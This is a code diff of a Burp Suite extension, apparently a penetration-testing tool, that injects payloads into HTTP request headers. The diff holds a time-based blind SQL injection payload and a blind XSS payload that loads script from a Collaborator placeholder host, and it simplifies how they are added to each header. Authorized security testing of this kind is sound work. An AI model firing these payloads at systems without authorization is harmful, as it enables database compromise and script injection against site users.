@@ -56,7 +56,7 @@ public class BurpHeaderBanger implements BurpExtension {
     private List<String> headers = new ArrayList<>();
     private List<String> sensitiveHeaders = new ArrayList<>();
     private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
-    private String bxssPayload = "Mozilla\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
+    private String bxssPayload = "\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
     private List<String> skipHosts = new ArrayList<>();
     private List<String> injectedHeaders = new ArrayList<>();
     private List<String> extraHeaders = new ArrayList<>();
@@ -326,21 +326,7 @@ public class BurpHeaderBanger implements BurpExtension {
         String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
         
         for (String header : headers) {
-            if ("Referer".equals(header)) {
-                continue; // Handle Referer separately
-            }
-            
-            if ("User-Agent".equals(header)) {
-                if (attackMode == 1) {
-                    // For SQLi, keep the Mozilla prefix
-                    injectedHeaders.add("User-Agent: Mozilla/5.0" + currentPayload);
-                } else {
-                    // For XSS, just use the payload directly
-                    injectedHeaders.add("User-Agent: " + currentPayload);
-                }
-            } else {
-                injectedHeaders.add(header + ": 1" + currentPayload);
-            }
+            injectedHeaders.add(header + ": " + currentPayload);
         }
         
         // Note: Extra headers are NOT added here - they should be added separately 
